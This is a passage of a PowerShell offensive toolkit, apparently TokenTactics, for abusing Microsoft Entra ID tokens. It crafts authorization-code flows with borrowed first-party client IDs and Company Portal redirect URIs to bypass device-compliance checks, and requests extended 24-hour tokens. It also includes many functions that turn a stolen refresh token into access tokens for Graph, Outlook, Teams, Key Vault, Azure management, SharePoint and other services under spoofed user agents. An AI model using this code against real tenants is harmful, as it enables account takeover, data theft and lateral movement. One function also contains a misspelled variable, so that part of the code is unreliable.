        $Claims = ( @{"access_token" = @{ "xms_cc" = @{ "values" = @("cp1") } } } | ConvertTo-Json -Compress -Depth 99 )
        $body.Add("claims", $Claims)
    }

    if ($CodeVerifier) {
        $body.Add("code_verifier", $CodeVerifier)
    }
    if ($UseV1Endpoint) {
        $body.Add("resource", $Resource)
    }
    Write-Verbose "Calling token endpoint with Authorization Code"
    Write-Verbose ( $body | ConvertTo-Json -Depth 99 )
    #endregion

    #region Exchange authorization code for tokens
    try {
        if ( $UseV1Endpoint ) {
            $TokenEndpointUri = "https://login.microsoftonline.com/common/oauth2/token"
        } else {
            $TokenEndpointUri = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
        }
        $global:response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri $TokenEndpointUri -Headers $Headers -Body $body
        $output = ConvertFrom-JWTtoken -token $response.access_token
        $global:TokenDomain = $output.upn -split '@' | Select-Object -Last 1
        $global:TokenUpn = $output.upn
        Write-Output "$([char]0x2713)  Token acquired and saved as `$response"
    } catch {
        Write-Error "Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
    #endregion
}

function Get-AzureAuthorizationCode {
    <#
    .DESCRIPTION


    .EXAMPLE
        # Use Windows based Redirect URL
        Get-AzureAuthorizationCode -RedirectUrl "ms-appx-web://Microsoft.AAD.BrokerPlugin/S-1-15-2-2666988183-1750391847-2906264630-3525785777-2857982319-3063633125-1907478113"

        # Use Android based Redirect URL
        Get-AzureAuthorizationCode -RedirectUrl "msauth://com.microsoft.windowsintune.companyportal/1L4Z9FJCgn5c0VLhyAxC5O9LdlE="

    .AUTHOR
        Adapted for TokenTactics from the original code by
        @gladstomych https://github.com/JumpsecLabs/TokenSmith and
        @zh54321 https://github.com/zh54321/PoCEntraDeviceComplianceBypass/blob/main/poc_entra_compliance_bypass.ps1
    #>

    [CmdletBinding()]
    Param(
        [ValidateSet("MSGraph", "Graph", "Custom")]
        [string]$Client = "MSGraph",
        [Parameter(Mandatory = $False)]
        [String]$ClientID = "9ba1a5c7-f17a-4de9-a1f1-6178c8d51223",
        [Parameter(Mandatory = $false)]
        [String]$RedirectUrl = "msauth://com.microsoft.windowsintune.companyportal/1L4Z9FJCgn5c0VLhyAxC5O9LdlE=",
        [Parameter(Mandatory = $False)]
        [string]$AuthorizationCodeState = "9gaPNizkzgtisKqA",
        [Parameter(Mandatory = $False)]
        [String]$Scope,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE,
        [Parameter(Mandatory = $False)]
        [switch]$UseCodeVerifier,
        [Parameter(Mandatory = $False)]
        [switch]$UseV1Endpoint,
        [Parameter(Mandatory = $False)]
        [string]$Resource,
        [Parameter(Mandatory = $False)]
        [switch]$OpenInBrowser
    )
    if ( $UseV1Endpoint ) {
        $BaseUrl = "https://login.microsoftonline.com/organizations/oauth2/authorize"
    } else {
        $BaseUrl = "https://login.microsoftonline.com/organizations/oauth2/v2.0/authorize"
    }
    $BaseUrl += "?response_type=code"
    $BaseUrl += "&redirect_uri=$RedirectUrl"
    $BaseUrl += "&state=$AuthorizationCodeState"
    if ($UseV1Endpoint) {
        $BaseUrl += "&resource=$Resource"
    }
    if ($UseCodeVerifier) {
        $CodeVerifier = Get-TTCodeVerifier
        $CodeChallenge = Get-TTCodeChallenge -CodeVerifier $CodeVerifier
        $BaseUrl += "&code_challenge=$CodeChallenge"
        $BaseUrl += "&code_challenge_method=S256"
    }

    if ($Client -ne "Custom" -and -not ( [string]::IsNullOrWhiteSpace($Scope) )) {
        Write-Warning "Custom scope is set but client is not set to Custom. Ignoring scope."
    }
    if ($Client -eq "Graph") {
        $BaseUrl += "&scope=https://graph.windows.net/.default offline_access openid"
    } elseif ($Client -eq "MSGraph") {
        $BaseUrl += "&scope=https://graph.microsoft.com/.default offline_access openid"
    } elseif ($Client -eq "Custom") {
        if ([string]::IsNullOrWhiteSpace($ClientID)) {
            Write-Error "ClientID must be provided for Custom client"
            return
        }
        if ([string]::IsNullOrWhiteSpace($Scope)) {
            Write-Error "Scope must be provided for Custom client"
            return
        }
        $BaseUrl += "&scope=$($Scope)"
    }
    $BaseUrl += "&client_id=$ClientID"
    if ($UseCAE) {
        # Add 'cp1' as client claim to get a access token valid for 24 hours
        $BaseUrl += "&claims=" + ( @{"access_token" = @{ "xms_cc" = @{ "values" = @("cp1") } } } | ConvertTo-Json -Compress -Depth 99 )
    }

    Write-Output $([uri]::EscapeUriString($BaseUrl))
    if ($OpenInBrowser) {
        Start-Process $BaseUrl
        Write-Output "1. The URL has been opened in your default browser"
    } else {
        Write-Output "1. Copy and paste the URL into a browser"
    }
    Write-Output "2. Enable the developer tools and switch to the network tab"
    Write-Output "3. Authenticate using your credentials"
    Write-Output "4. Copy either the Request URL from the header tab or the code value from the payload tab"
    Write-Output "5. Use the code value (-AuthorizationCode) or complete Request URL (-RequestURL) to get a token:"
    Write-Output ""
    Write-Output "   `$AuthCode = Get-Clipboard"
    if ($UseCodeVerifier) {
        $CodeVerifierString = "-CodeVerifier `"$CodeVerifier`""
    }
    if ($UseV1Endpoint) {
        $V1EndpointString = "-Resource $($Resource) -UseV1Endpoint `$$($UseV1Endpoint)"
    }
    if ($Client -eq "Custom") {
        Write-Output "   Get-AzureTokenFromAuthorizationCode -Client Custom -RedirectUrl `"$RedirectUrl`" -ClientID `"$ClientID`" -Scope `"$Scope`" -AuthorizationCode `$AuthCode $CodeVerifierString $V1EndpointString"
    } else {
        Write-Output "   Get-AzureTokenFromAuthorizationCode -Client $Client -RedirectUrl `"$RedirectUrl`" -AuthorizationCode `$AuthCode $CodeVerifierString $V1EndpointString"
    }
}

# Refresh Token Functions
function Invoke-RefreshToSubstrateToken {
    <#
    .DESCRIPTION
        Generate a Substrate token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToSubstrateToken -domain myclient.org -refreshToken ey....
        $SubstrateToken.access_token
    #>

    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        $ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://substrate.office.com/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:SubstrateToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$SubstrateToken"
        $SubstrateToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToMSManageToken {
    <#
    .DESCRIPTION
        Generate a manage token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToMSManage -domain myclient.org -refreshToken ey....
        $MSManageToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        $ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://enrollment.manage.microsoft.com/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:MSManageToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$MSManageToken"
        $MSManageToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToMSTeamsToken {
    <#
    .DESCRIPTION
        Generate a Microsoft Teams token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToMSTeamsToken -domain myclient.org -refreshToken ey....
        $MSTeamsToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        $ClientId = "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://api.spaces.skype.com/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:MSTeamsToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$MSTeamsToken"
        $MSTeamsToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToOfficeManagementToken {
    <#
    .DESCRIPTION
        Generate a Office Manage token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToOfficeManagementToken -domain myclient.org -refreshToken ey....
        $OfficeManagement.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        $ClientId = "00b41c95-dab0-4487-9791-b9d2c32c80f2",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://manage.office.com/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:OfficeManagementToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$OfficeManagementToken"
        $OfficeManagementToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToOutlookToken {
    <#
    .DESCRIPTION
        Generate a Microsoft Outlook token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToOutlookToken -domain myclient.org -refreshToken ey....
        $OutlookToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        $ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://outlook.office365.com/.default offline_access openid"
        CustomUserAgent = $CustomUserAgen
    }

    try {
        $global:OutlookToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$OutlookToken"
        $OutlookToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToMSGraphToken {
    <#
    .DESCRIPTION
        Generate a Microsoft Graph token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToMSGraphToken -domain myclient.org -refreshToken ey....
        $MSGraphToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        [string]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://graph.microsoft.com/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:MSGraphToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$MSGraphToken"
        $MSGraphToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToGraphToken {
    <#
    .DESCRIPTION
        Generate a windows graph token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToGraphToken -domain myclient.org -refreshToken ey....
        $GraphToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        [string]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://graph.windows.net/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:GraphToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$GraphToken"
        $GraphToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToOfficeAppsToken {
    <#
    .DESCRIPTION
        Generate a Microsoft Office Apps token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToOfficeAppsToken -domain myclient.org -refreshToken ey....
        $OfficeAppsToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        [string]$ClientID = "ab9b8c07-8f02-4f72-87fa-80105867a763",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://officeapps.live.com/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:OfficeAppsToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$OfficeAppsToken"
        $OfficeAppsToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToAzureCoreManagementToken {
    <#
    .DESCRIPTION
        Generate a Microsoft Azure Core Mangement token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToAzureCoreManagementToken -domain myclient.org -refreshToken ey....
        $AzureCoreManagementToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        $ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://management.core.windows.net/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:AzureCoreManagementToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$AzureCoreManagementToken"
        $AzureCoreManagementToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToAzureStorageToken {
    <#
    .DESCRIPTION
        Generate a Microsoft Azure Storage token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToAzureStorageToken -domain myclient.org -refreshToken ey....
        $AzureStorageToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        [string]$ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://storage.azure.com/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:AzureStorageToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$AzureStorageToken"
        $AzureStorageToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToAzureKeyVaultToken {
    <#
    .DESCRIPTION
        Generate a Microsoft Azure Key Vault token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToAzureKeyVaultToken -domain myclient.org -refreshToken ey....
        $AzureKeyVaultToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        [string]$ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $RefreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://vault.azure.net/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:AzureKeyVaultToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$AzureKeyVaultToken"
        $AzureKeyVaultToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToAzureManagementToken {
    <#
    .DESCRIPTION
        Generate a Microsoft Azure Mangement token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToAzureManagementToken -domain myclient.org -refreshToken ey....
        $AzureManagementToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        $ClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://management.azure.com/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:AzureManagementToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$AzureManagementToken"
        $AzureManagementToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToMAMToken {
    <#
    .DESCRIPTION
        Generate a Microsoft intune mam token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToMAMToken -domain myclient.org -refreshToken ey....
        $MAMToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        $ClientId = "6c7e8096-f593-4d72-807f-a5f86dcc9c77",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        Scope        = "https://intunemam.microsoftonline.com/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:MAMToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$MamToken"
        $MamToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToDODMSGraphToken {
    <#
    .DESCRIPTION
        Generate a Microsoft DOD Graph token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToDODMSGraphToken -domain myclient.org -refreshToken ey....
        $DODMSGraphToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        [string]$ClientID = "d3590ed6-52b3-4102-aeff-aad2292ab01c",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    $Parameters = @{
        Domain       = $Domain
        refreshToken = $refreshToken
        ClientID     = $ClientID
        Device       = $Device
        Browser      = $Browser
        UseCAE       = $UseCAE
        UseDoD       = $true
        Scope        = "https://dod-graph.microsoft.us/.default offline_access openid"
        CustomUserAgent = $CustomUserAgent
    }

    try {
        $global:DODMSGraphToken = Invoke-RefreshToToken @Parameters
        Write-Output "$([char]0x2713)  Token acquired and saved as `$DODMSGraphToken"
        $DODMSGraphToken | Select-Object token_type, scope, expires_in, ext_expires_in | Format-List
    } catch {
        Write-Output "$([char]0x274C) Could not get tokens $($_.ErrorDetails | ConvertFrom-Json | Select-Object -ExpandProperty error_description)"
    }
}

function Invoke-RefreshToSharePointToken {
    <#
    .DESCRIPTION
        Generate a Microsoft SharePoint token from a refresh token.
    .EXAMPLE
        Invoke-RefreshToSharePointToken -domain myclient.org -refreshToken ey....
        $SharePointToken.access_token
    #>
    [CmdletBinding()]
    Param(
        [Alias("ResourceTenant")]
        [Parameter(Mandatory = $true)]
        [string]$Domain,
        [Parameter(Mandatory = $true)]
        [string]$SharePointTenantName,
        [Parameter(Mandatory = $false)]
        [switch]$UseAdmin,
        [Parameter(Mandatory = $false)]
        [string]$RefreshToken = $response.refresh_token,
        [Parameter(Mandatory = $false)]
        [string]$ClientID = "9bc3ab49-b65d-410a-85ad-de819febfddc",
        [Parameter(Mandatory = $False)]
        [String]$CustomUserAgent,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Mac', 'Windows', 'Linux', 'AndroidMobile', 'iPhone', 'OS/2')]
        [String]$Device,
        [Parameter(Mandatory = $False)]
        [ValidateSet('Android', 'IE', 'Chrome', 'Firefox', 'Edge', 'Safari')]
        [String]$Browser,
        [Parameter(Mandatory = $False)]
        [Switch]$UseCAE
    )

    if ($UseAdmin) {
        $AdminSuffix = "-admin"
    } else {
        $AdminSuffix = ""
    }

